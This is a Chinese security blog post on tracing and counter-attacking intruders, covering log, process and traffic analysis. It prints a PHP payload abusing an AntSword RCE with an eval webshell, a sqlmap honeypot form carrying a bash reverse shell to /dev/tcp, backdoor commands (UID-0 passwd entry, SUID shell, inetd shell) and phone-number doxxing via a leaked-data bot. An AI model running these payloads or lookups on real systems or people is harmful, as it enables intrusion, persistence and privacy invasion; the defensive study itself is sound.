<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>溯源反制思路整合 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="溯源反制思路整合" />
<meta property="og:description" content="溯源反制思路整合 文章目录 溯源反制思路整合0x01反制的整体思路0x02 反制具体思路0x0201 反制主机0x0202 反制后门附件0x0203 反制攻击工具 0x03 拿下傀儡机之后如何进行源IP的查找0x0301 日志分析01 Web日志分析02 系统日志分析 0x0302 进程分析WindowsLinux 0x0303 流量分析通用Windowslinux 0x0304 服务查询WindowsLInux 0x0305 其他技巧通用查询在线登陆者 0x04 溯源相关思路根据IP进行溯源根据域名进行溯源根据ID溯源根据病毒源码细节溯源通过手机号码溯源 总结 0x01反制的整体思路 反入侵得到攻击者机器权限 -&gt; 入侵现场还原，摸清入侵思路 -&gt; 并且须知入侵者的相关后门遗留，以便处理后门 -&gt; 抓取入侵者的真实IP获得地理位置 -&gt; 并按照攻击者的攻击路线加固相关漏洞安全。
0x02 反制具体思路 0x0201 反制主机 傀儡机一般都是具有漏洞的主机，可以使用常规渗透测试的手段进行攻击，这个操作就非常广了，在这里不过多赘述。
0x0202 反制后门附件 对附件进行逆向分析，得到C2地址，然后对目标ip进行渗透攻击。有些钓鱼邮件头中，没有对源地址进行伪装，那么就有可能获取到源IP或者域名 留下的后门中有对自己的teamserver回传数据，可以通过分析后门，或者查看后门源码得知。 0x0203 反制攻击工具 倘若对方使用带有漏洞版本的攻击工具例如蚁剑、AWVS等，这时候可以使用RCE攻击对其进行反控，高版本蚁剑上此漏洞已经被修复。
已知有漏洞的工具版本：
蚁剑 &lt;=2.0.7
可以RCE的漏洞 https://github.com/AntSwordProject/antSword/issues/147
被发现另外一枚可以RCE的漏洞 https://github.com/AntSwordProject/antSword/issues/150
Payload:
&lt;?php if(strlen($_POST[1]) == 153){ preg_match_all(&#39;/echo &#34;(\w&#43;)&#34;;/i&#39;, $_POST[1], $mat); $profix = $mat[1][0]; $suffix = $mat[1][1]; echo $profix;?&gt; &lt;!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/95be47aa5eade49e1a7c5899a18f3629/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-07-27T20:26:04+08:00" />
<meta property="article:modified_time" content="2021-07-27T20:26:04+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">溯源反制思路整合</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-dracula">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="_1"></a>溯源反制思路整合</h2> 
<p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><a href="#_1" rel="nofollow">溯源反制思路整合</a></li><li><ul><li><a href="#0x01_4" rel="nofollow">0x01反制的整体思路</a></li><li><a href="#0x02__10" rel="nofollow">0x02 反制具体思路</a></li><li><ul><li><a href="#0x0201__12" rel="nofollow">0x0201 反制主机</a></li><li><a href="#0x0202__16" rel="nofollow">0x0202 反制后门附件</a></li><li><a href="#0x0203__25" rel="nofollow">0x0203 反制攻击工具</a></li></ul> 
   </li><li><a href="#0x03_IP_111" rel="nofollow">0x03 拿下傀儡机之后如何进行源IP的查找</a></li><li><ul><li><a href="#0x0301__115" rel="nofollow">0x0301 日志分析</a></li><li><ul><li><a href="#01_Web_117" rel="nofollow">01 Web日志分析</a></li><li><a href="#02__133" rel="nofollow">02 系统日志分析</a></li></ul> 
    </li><li><a href="#0x0302__173" rel="nofollow">0x0302 进程分析</a></li><li><ul><li><a href="#Windows_175" rel="nofollow">Windows</a></li><li><a href="#Linux_196" rel="nofollow">Linux</a></li></ul> 
    </li><li><a href="#0x0303__216" rel="nofollow">0x0303 流量分析</a></li><li><ul><li><a href="#_218" rel="nofollow">通用</a></li><li><a href="#Windows_228" rel="nofollow">Windows</a></li><li><a href="#linux_234" rel="nofollow">linux</a></li></ul> 
    </li><li><a href="#0x0304__240" rel="nofollow">0x0304 服务查询</a></li><li><ul><li><a href="#Windows_242" rel="nofollow">Windows</a></li><li><a href="#LInux_315" rel="nofollow">LInux</a></li></ul> 
    </li><li><a href="#0x0305__374" rel="nofollow">0x0305 其他技巧</a></li><li><a href="#_383" rel="nofollow">通用</a></li><li><ul><li><a href="#_385" rel="nofollow">查询在线登陆者</a></li></ul> 
   </li></ul> 
   </li><li><a href="#0x04__395" rel="nofollow">0x04 溯源相关思路</a></li><li><ul><li><a href="#IP_397" rel="nofollow">根据IP进行溯源</a></li><li><a href="#_414" rel="nofollow">根据域名进行溯源</a></li><li><a href="#ID_421" rel="nofollow">根据ID溯源</a></li><li><a href="#_428" rel="nofollow">根据病毒源码细节溯源</a></li><li><a href="#_441" rel="nofollow">通过手机号码溯源</a></li></ul> 
   </li><li><a href="#_451" rel="nofollow">总结</a></li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h3><a id="0x01_4"></a>0x01反制的整体思路</h3> 
<p>反入侵得到攻击者机器权限 -&gt; 入侵现场还原，摸清入侵思路 -&gt; 并且须知入侵者的相关后门遗留，以便处理后门 -&gt; 抓取入侵者的真实IP获得地理位置 -&gt; 并按照攻击者的攻击路线加固相关漏洞安全。</p> 
<h3><a id="0x02__10"></a>0x02 反制具体思路</h3> 
<h4><a id="0x0201__12"></a>0x0201 反制主机</h4> 
<p>傀儡机一般都是具有漏洞的主机，可以使用常规渗透测试的手段进行攻击，这个操作就非常广了，在这里不过多赘述。</p> 
<h4><a id="0x0202__16"></a>0x0202 反制后门附件</h4> 
<ol><li>对附件进行逆向分析，得到C2地址，然后对目标ip进行渗透攻击。</li><li>有些钓鱼邮件头中，没有对源地址进行伪装，那么就有可能获取到源IP或者域名</li></ol> 
<p><img src="https://images2.imgbox.com/68/28/KrE8mh0X_o.png" alt=""></p> 
<ol start="3"><li>留下的后门中有对自己的teamserver回传数据，可以通过分析后门，或者查看后门源码得知。</li></ol> 
<h4><a id="0x0203__25"></a>0x0203 反制攻击工具</h4> 
<p>倘若对方使用带有漏洞版本的攻击工具例如蚁剑、AWVS等，这时候可以使用RCE攻击对其进行反控，高版本蚁剑上此漏洞已经被修复。<br> 已知有漏洞的工具版本：</p> 
<ol><li> <p><strong>蚁剑 &lt;=2.0.7</strong><br> 可以RCE的漏洞 https://github.com/AntSwordProject/antSword/issues/147</p> <p>被发现另外一枚可以RCE的漏洞 https://github.com/AntSwordProject/antSword/issues/150</p> <p>Payload:</p> <pre><code class="prism language-php+HTML">&lt;?php
if(strlen($_POST[1]) == 153){
    preg_match_all('/echo "(\w+)";/i', $_POST[1], $mat);

    $profix = $mat[1][0];
    $suffix = $mat[1][1];
    echo $profix;?&gt;
    &lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;title&gt;Hello World!&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;h1&gt;Hello World!&lt;/h1&gt;
    &lt;p&gt;This window does not have access to node bindings.&lt;/p&gt;
    &lt;pre&gt;process: &lt;script&gt;document.write(process)&lt;/script&gt;&lt;/pre&gt;
    &lt;script&gt;
      window.open('data:text/html,But this one does! &lt;br&gt;&lt;pre&gt;process.cwd(): &lt;script&gt;document.write(process.cwd());const {spawn} = require("child_process");spawn("open",["/Applications/Calculator.app"]);&lt;/scr'+'ipt&gt;&lt;/pre&gt;');
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
    &lt;?php
    echo $suffix;
}else{
    eval($_POST[1]);
}
</code></pre> <p><img src="https://images2.imgbox.com/da/b2/m0BQ3uOz_o.gif" alt=""></p> </li><li> <p><strong>awvs 10</strong><br> 直接利用exp，等待对方扫描自己，即刻上线。exp下载地址：https://github.com/dzonerzy/acunetix_0day</p> </li><li> <p><strong>cobalt strike</strong></p> <p>3.5版本teamserver有RCE漏洞</p> <p>可以爆破teamserver密码，然后得到黑客攻击的其他傀儡机。</p> <p>exp利用地址：https://github.com/ryanohoro/csbruter</p> </li><li> <p><strong>sqlmap</strong><br> 构造特殊的get或者post注入点来等待攻击者使用sqlmap扫描，例如下图，将get请求中的一个参数的值设置为<code>ls</code>l,倘若直接改成反弹shell的代码即可反控对方机器。</p> <p><img src="https://images2.imgbox.com/11/36/Qg9Pi948_o.png" alt=""></p> <p>post利用方式：</p> <pre><code class="prism language-html">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span> A sqlmap honeypot demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span><span class="token punctuation">&gt;</span></span>search the user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>input</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>myForm<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username.html<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/plain<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>hidden<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>name<span class="token punctuation">'</span></span><span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>Robin&amp;id=4567&amp;command=shell`bash -i &gt;&amp;/dev/tcp/192.168.xxx.xxx/2333 0&gt;&amp;1`&amp;port=1234<span class="token punctuation">'</span></span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span><span class="token attr-name">οnclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>myForm.submit()<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre> </li></ol> 
<h3><a id="0x03_IP_111"></a>0x03 拿下傀儡机之后如何进行源IP的查找</h3> 
<p>一般拿到傀儡机之后，就需要查找下一步攻击者的信息了，当然攻击者也很有可能搭建socks代理来攻击，但是还是有可能会发现真实攻击者的蛛丝马迹的。</p> 
<h4><a id="0x0301__115"></a>0x0301 日志分析</h4> 
<h5><a id="01_Web_117"></a>01 Web日志分析</h5> 
<p>Nginx，Apache，IIS，Tomcat</p> 
<p>可以查看分析攻击者的IP，访问的UA</p> 
<p><img src="https://images2.imgbox.com/55/d9/j7zWYuJE_o.png" alt=""></p> 
<p>可以grep木马页面筛选攻击者IP，</p> 
<p>查看日志中某个路径访问最多的10个IP</p> 
<p><code>cat gitsort.log | grep "/language/HTML" | cut -d ' ' -f 1 | sort | uniq -c | sort -nr | head -n 10</code></p> 
<p><img src="https://images2.imgbox.com/73/c3/7X1CuLBN_o.png" alt=""></p> 
<h5><a id="02__133"></a>02 系统日志分析</h5> 
<p>可以看到访问者的IP</p> 
<p><strong>Windows</strong></p> 
<p>日志路径：<code>C:\Windows\System32\winevt\Logs</code><br> 必看日志：<code>Security.evtx、System.evtx、Application.evtx</code></p> 
<p><img src="https://images2.imgbox.com/3c/a4/ZMU4mBL0_o.png" alt=""></p> 
<p><strong>Linux</strong></p> 
<ol><li>日志路径：<code>/var/log</code><br> 必看日志：<code>secure、history</code></li></ol> 
<pre><code class="prism language-shell">/var/log/boot.log：录了系统在引导过程中发生的事件，就是Linux系统开机自检过程显示的信息
/var/log/lastlog ：记录最后一次用户成功登陆的时间、登陆IP等信息
/var/log/messages ：记录Linux操作系统常见的系统和服务错误信息
/var/log/secure ：Linux系统安全日志，记录用户和工作组变坏情况、用户登陆认证情况
/var/log/btmp ：记录Linux登陆失败的用户、时间以及远程IP地址
/var/log/syslog：只记录警告信息，常常是系统出问题的信息，使用lastlog查看
/var/log/wtmp：该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件，使用last命令查看
/var/run/utmp：该日志文件记录有关当前登录的每个用户的信息。如 who、w、users、finger等就需要访问这个文件
/var/log/syslog 或 /var/log/messages 存储所有的全局系统活动数据，包括开机信息。基于 Debian 的系统如 Ubuntu 在 /var/log/syslog 中存储它们，而基于 RedHat 的系统如 RHEL 或 CentOS 则在 /var/log/messages 中存储它们。
/var/log/auth.log 或 /var/log/secure 存储来自可插拔认证模块<span class="token punctuation">(</span>PAM<span class="token punctuation">)</span>的日志，包括成功的登录，失败的登录尝试和认证方式。Ubuntu 和 Debian 在 /var/log/auth.log 中存储认证信息，而 RedHat 和 CentOS 则在 /var/log/secure 中存储该信息。
</code></pre> 
<ol start="2"><li> <p>lastlog 查看最后登陆日志</p> <p><img src="https://images2.imgbox.com/a9/82/k2ZYDmOS_o.png" alt=""></p> </li><li> <p>查看 /var/log/secure日志</p> <p><img src="https://images2.imgbox.com/38/19/5Eh9U9IF_o.png" alt=""></p> </li><li> <p>history命令<br> 查看历史命令记录，运气好的话可以获得比较关键的信息</p> </li></ol> 
<h4><a id="0x0302__173"></a>0x0302 进程分析</h4> 
<h5><a id="Windows_175"></a>Windows</h5> 
<ol><li> <p>tasklist</p> <p>查看进程列表，eg： tasklist | find "16376"进一步查看16376进程的具体信息。</p> </li><li> <p>WMIC扩展WMI（Windows Management Instrumentation，Windows管理规范） ，提供了从命令行接口和批命令脚本执行系统管理的支持。C:\users\fengxuan&gt;wmic<br> wmic:root\cli&gt;</p> <p>这时，在命令行再输入process, 就可以查看完整的进程信息了。</p> <p><img src="https://images2.imgbox.com/f4/55/QWCHM1lW_o.png" alt=""></p> </li><li> <p>windows的任务管理器是很好的进程查看工具，当然大家还可以使用一些其他工具，比如Kernel Detective 来帮助你检测</p> <p>https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</p> <p><img src="https://images2.imgbox.com/e2/a0/4mBhmZLZ_o.png" alt=""></p> </li></ol> 
<h5><a id="Linux_196"></a>Linux</h5> 
<ol><li> <p>ps</p> <p><code>ps aux</code> 查看进程</p> </li><li> <p>/proc/进程号<br> 进程信息<br> 在浏览 /proc 目录的时候您会发现许多目录的名称是一些数字。这些目录保存了当前系统中运行的所有进程的信息。</p> <p><img src="https://images2.imgbox.com/11/0d/Yn3noy9e_o.png" alt="img"></p> </li><li> <p>Top 命令，查看进程占用系统资源情况</p> </li><li> <p>lsof命令</p> </li></ol> 
<h4><a id="0x0303__216"></a>0x0303 流量分析</h4> 
<h5><a id="_218"></a>通用</h5> 
<p><code>netstat -an</code> 查看网络连接<br> <code>netstat -na|grep ESTABLISHED</code> 查看已经连接上的网络IP<br> <code>netstat -unltp</code> 查看进程占用的端口号 （很有用）</p> 
<p><img src="https://images2.imgbox.com/8d/9a/mV9DOpuv_o.png" alt=""></p> 
<h5><a id="Windows_228"></a>Windows</h5> 
<p>wireshark</p> 
<p>fiddler</p> 
<h5><a id="linux_234"></a>linux</h5> 
<p><code>tcpdump</code></p> 
<p>使用命令 <code>tcpdump -i any -c100 -nn -w /tmp/tcpdump_save.cap</code> 将抓到的包放到wireshark中进行分析</p> 
<h4><a id="0x0304__240"></a>0x0304 服务查询</h4> 
<h5><a id="Windows_242"></a>Windows</h5> 
<p>常见的后门技术列表：</p> 
<p>1、隐藏、克隆账户<br> <code>test$</code>，<br> 查找方式 ：<br> 需要在界面上的用户管理查看，而不是单单在命令行查看</p> 
<p>2、shift后门<br> 将C盘windows目录下面的system32文件里面的sethc.exe应用程序进行转移，并生成sethc.exe.bak文件。并将cmd.exe拷贝覆盖sethc.exe<br> 查找方式 ：<br> Md5 sethc.exe 看下是不是cmd.exe 的MD5</p> 
<p><code>certutil -hashfile filename MD5</code></p> 
<p>3、启动项、计划任务</p> 
<p>【启动项】</p> 
<p>查找方式 ：<br> window–开始–所有程序–启动</p> 
<p>【组策略欺骗】</p> 
<p>组策略，运行gpedit.msc，通过最策略的“脚本(启动/关机)”项来说实现。</p> 
<p><img src="https://images2.imgbox.com/d6/eb/6XBJ1nGK_o.png" alt=""></p> 
<p>查找方式 ：</p> 
<p>具体位置在“计算机配置→Windows设置”项下。因为其极具隐蔽性，因此常常被攻击者利用来做服务器后门。</p> 
<p>【计划任务】</p> 
<p>查找方式 ：<br> window–开始–所有程序–附件–系统工具–任务计划程序</p> 
<p>4、劫持技术</p> 
<p>查找方式 ：<br> 所谓的映像劫持就是Image File Execution Options（IFEO）,位于注册表的 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</p> 
<p>查找方式 ：</p> 
<p>这个注册项中有恶意的键值对就需要排查.</p> 
<p>5、Powershell后门</p> 
<p>如何创建稳定的powershell backdoor https://github.com/AV1080p/Schtasks-Backdoor</p> 
<p>查找方式 ：</p> 
<p>查看进程中是否有powershell的常驻进程</p> 
<p>6、远控软件</p> 
<p>Cobaltstrike, 灰鸽子。只能通过进程分析和流量分析才能找到木马。因为cs可以注入到其他进程中比如说System进程。</p> 
<p>查找方式 ：</p> 
<p>通过任务管理器分析进程，还需要通过WSExplorer进行进程抓包。</p> 
<p>7、嗅探技术</p> 
<p>Cain</p> 
<p><img src="https://images2.imgbox.com/e3/cc/WciEFI5i_o.png" alt=""></p> 
<p>查找方式 ：</p> 
<p>查看进程</p> 
<h5><a id="LInux_315"></a>LInux</h5> 
<ol><li> <p>增加超级用户帐号</p> <p><code>echo "mx7krshell:x:0:0::/:/bin/sh" &gt;&gt; /etc/passwd</code></p> <p>查找方式 ：</p> <p>查看 /etc/passwd 是否有UID为0的用户</p> </li><li> <p>破解/嗅控用户密码</p> <p>查找方式 ：查看进程，分析</p> </li><li> <p>放置SUID Shell</p> </li></ol> 
<pre><code class="prism language-shell"><span class="token function">cp</span> /bin/bash /dev/.rootshell
<span class="token function">chmod</span> u+s /dev/.rootshell
</code></pre> 
<p>查找系统中设置了SUID权限的文件</p> 
<pre><code class="prism language-shell"><span class="token function">find</span> / -perm +4000 -exec <span class="token function">ls</span> -ld <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span> <span class="token punctuation">\</span><span class="token punctuation">;</span> //查找设置了SUID权限的文件
<span class="token function">find</span> / -perm +6000 -exec <span class="token function">ls</span> -ld <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span> <span class="token punctuation">\</span><span class="token punctuation">;</span>  //上面的-6000表示既具有suid权限又具有sgid权限的文件
</code></pre> 
<ol start="4"><li> <p>利用系统服务程序</p> <pre><code class="prism language-shell">修改/etc/inetd.conf
daytime stream tcp nowait /bin/sh <span class="token function">sh</span> –I
用trojan程序替换in.telnetd、in.rexecd等 inted的服务程序重定向login程序
</code></pre> <p>查找方式 ：查看配置文件，查看文件MD5</p> </li><li> <p>TCP/UDP/ICMP Shell</p> <p>Ping Backdoor，通过ICMP包激活后门， 形成一个Shell通道。<br> TCP ACK数据包后门，能够穿越防火墙。</p> <p>Linux下的icmp shell后门 容易被发现</p> <p>http://prdownloads.sourceforge.net/icmpshell/ish-v0.2.tar.gz</p> <p>这个是py版的 https://github.com/inquisb/icmpsh/blob/master/icmpsh_m.py</p> <p>查找方式 ：查看进程</p> </li><li> <p>Crontab定时任务</p> </li></ol> 
<pre><code class="prism language-shell"><span class="token function">crontab</span> -l <span class="token comment">#查看服务</span>
</code></pre> 
<h4><a id="0x0305__374"></a>0x0305 其他技巧</h4> 
<ol><li> <p>查看公钥，获取攻击者电脑名<br> <img src="https://images2.imgbox.com/e7/52/YwHaInp9_o.png" alt=""></p> </li><li> <p>查看其他操作日志记录，比如说Openvpn</p> </li></ol> 
<h4><a id="_383"></a>通用</h4> 
<h5><a id="_385"></a>查询在线登陆者</h5> 
<p>LInux： w命令</p> 
<p>Windows：query user</p> 
<p>进程分析得到的病毒样本，可以在https://x.threatbook.cn/ 微步进行HASH查询,https://www.virustotal.com/ 这个网站上进行查询，可以检测是否为病毒，还有可以得到病毒的C2地址。</p> 
<p><img src="https://images2.imgbox.com/02/d7/4EstNj0k_o.png" alt=""></p> 
<h3><a id="0x04__395"></a>0x04 溯源相关思路</h3> 
<h4><a id="IP_397"></a>根据IP进行溯源</h4> 
<ol><li> <p>微步在线</p> <p>https://x.threatbook.cn/</p> <p><img src="https://images2.imgbox.com/34/9b/saCkkIM6_o.png" alt=""></p> 
  <ol start="2"><li> <p>https://www.virustotal.com/</p> <p><img src="https://images2.imgbox.com/78/c2/b0cmlwa8_o.png" alt=""></p> </li></ol> </li><li> <p>搜索引擎搜索</p> </li><li> <p>github搜索</p> </li></ol> 
<h4><a id="_414"></a>根据域名进行溯源</h4> 
<ol><li>whois查询</li><li>备案查询</li><li>企查查/天眼查查询</li><li>zoomeye/fofa查询</li></ol> 
<h4><a id="ID_421"></a>根据ID溯源</h4> 
<ol><li>在搜索引擎查找</li><li>在github，gitee，开源中国中查找</li><li>在社交平台上查找，（微信/微博/linkedin/twitter）</li><li>在安全群/安全圈子里询问。</li></ol> 
<h4><a id="_428"></a>根据病毒源码细节溯源</h4> 
<ol><li> <p>查找代码中比较特殊的字符比如说：</p> <p><img src="https://images2.imgbox.com/c5/8b/rBhAnkIF_o.png" alt=""></p> <p>在github中搜索这个特殊字符串“\x47\x4c\x4fB\x41\x4c\x53”。</p> </li><li> <p>查看代码中是否有请求攻击者其他主机的功能，会有IP，域名</p> </li></ol> 
<h4><a id="_441"></a>通过手机号码溯源</h4> 
<pre><code>1. 社交平台查询(微信/支付宝/微博/抖音)
2. 通过telegram里社工库机器人进行精准信息查询，机器人ID：@sgkmainbot
3. 查询注册过哪些网站 网站地址：https://www.reg007.com/
</code></pre> 
<p><img src="https://images2.imgbox.com/d2/dc/cSwXqsIr_o.png" alt=""></p> 
<h3><a id="_451"></a>总结</h3> 
<p>这篇文章是我目前知道的溯源反制的所有的操作细节规范，在以后如果有新的技术出现，我也会及时的补充进去，我把这个文档放在Notion上，动态的更新，大家可以随时查看下:</p> 
<p>https://fengxuan.notion.site/0fd37de0b16b44b9a546304ff83f82e8</p> 
<p>这里我就放一张思维导图，大家可以在工作的时候参考。</p> 
<p><img src="https://images2.imgbox.com/0b/49/X5zbffBB_o.png" alt=""></p> 
<p>我的公号：风炫安全， 领取蓝队资料<br> <img src="https://images2.imgbox.com/e4/70/VY6DrxDf_o.png" alt="在这里插入图片描述"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/a2fc0af8c14388140228fbce21a03689/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">计算机rs485通讯,RS485与电脑通信</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/31beff95dcf8714119b36d587c07ac8b/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">远程连接redis失败原因(Linux)</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>